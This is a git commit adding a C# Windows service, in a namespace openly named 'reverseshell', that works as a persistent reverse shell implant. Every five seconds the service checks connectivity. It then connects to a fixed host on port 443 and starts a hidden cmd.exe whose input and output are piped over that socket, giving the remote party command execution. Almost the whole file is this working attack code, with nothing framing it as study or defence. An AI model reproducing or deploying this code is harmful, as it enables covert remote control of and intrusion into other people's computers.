66ddf1822592ff41288a452f518b14fc531ac25d
LeTuyen-Kami <82325497+LeTuyen-Kami@users.noreply.github.com>
2021-04-11 22:06:09 +0700

    Add files via upload

---
+++ Service1.cs
@@ -0,0 +1,144 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+
+namespace reverseshell
+{
+    public partial class Service1 : ServiceBase
+    {
+        Timer timer = new Timer();
+        static StreamWriter streamWriter;
+
+        public Service1()
+        {
+            InitializeComponent();
+        }
+        bool checknetwork()
+        {
+            Ping p1 = new Ping();
+            PingReply PR = p1.Send("8.8.8.8");
+            // check when the ping is not success
+            if (!PR.Status.ToString().Equals("Success"))
+            {
+                WriteToFile("Not success " + DateTime.Now);
+                return false;
+            }
+            // check after the ping is n success
+            return true;
+        }
+        protected override void OnStart(string[] args)
+        {
+            WriteToFile("Service is started at " + DateTime.Now);
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = 5000; //number in milisecinds 
+            timer.Enabled = true;
+            if (checknetwork() == true)
+            {
+                WriteToFile("Internet: OK ! " + DateTime.Now);
+            }
+            else
+            {
+                WriteToFile("No internet ! " + DateTime.Now);
+            }
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            WriteToFile("Service is recall at " + DateTime.Now);
+            if (checknetwork() == true)
+            {
+                reverseshell();
+            }
+        }
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory +
+           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
+           ".txt";
+            if (!File.Exists(filepath))
+            {
+                // Create a file to write to. 
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+
+        }
+        public static void reverseshell()
+        {
+            using (TcpClient client = new TcpClient("10.0.139.6", 443))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader rdr = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
+
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            //strInput.Append("\n");
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
+        }
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception ex) { }
+            }
+        }
+    }
+}
